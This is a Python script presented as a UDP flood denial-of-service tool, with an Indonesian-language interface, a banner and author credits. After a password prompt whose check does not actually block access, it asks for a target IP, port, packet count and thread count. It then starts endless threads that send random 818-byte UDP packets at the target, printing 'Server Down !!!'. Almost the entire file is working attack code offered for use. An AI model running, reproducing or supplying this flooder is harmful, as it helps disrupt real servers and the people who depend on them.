import random
import socket
import threading
import sys
import os
import signal
import time
from os import system, name

os.system("clear")
password ="D4RK"

for i in range(3):
	pwd = input("\033[93m> Masukan Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[92mSabar Tod")
		break
	else:
		time.sleep(5)
		print("\033[91m> [×] Password Nya Salah Tod")
		continue
time.sleep(5)
print("\033[94m> [✓] Password Benar Tod")

os.system("clear")
print("\033[1m Tools By Dark")
print("------------------------------------------------")
print("[+] Tools Used By : Dark")
print("[+] Credit Tools : Lordzz,Dark")
print("[+] Jangan Abuse Ya Kontol")
print("------------------------------------------------")

print("""\033[31m

██████╗  █████╗ ██████╗ ██╗  ██╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
██║░░██║███████║██████╔╝█████╔╝ 
██║░░██║██╔══██║██╔══██╗██╔═██╗ 
██████╔╝██║  ██║██║  ██║██║  ██╗
╚═════╝ ╚═╝   ═╝╚═╝  ╚═╝╚═╝  ╚═╝
                                
                                  """)


ip = str(input(" [ / ]  Target IP      ====> :"))
port = int(input(" [ / ]  Target Port  ====> :"))
choice = str(input(" [ / ]  (y/n)      ====> :"))
times = int(input(" [ / ]  Packets     ====> :"))
threads = int(input(" [ / ]  Threads   ====> :"))

def run():
    data = random._urandom(818)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Server Down !!! ")
        except:
            print("[*] Server Down !!! ")

def run2():
    data = random._urandom(818)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Server Down !!! ")
        except:
            s.close()
            print("[*] Server Down !!! ")
            
def run3():
    data = random._urandom(818)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Server Down !!! ")
        except:
            s.close()
            print("[*] Server Down !!! ")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
    else:
        th = threading.Thread(target = run3)
        th.start()
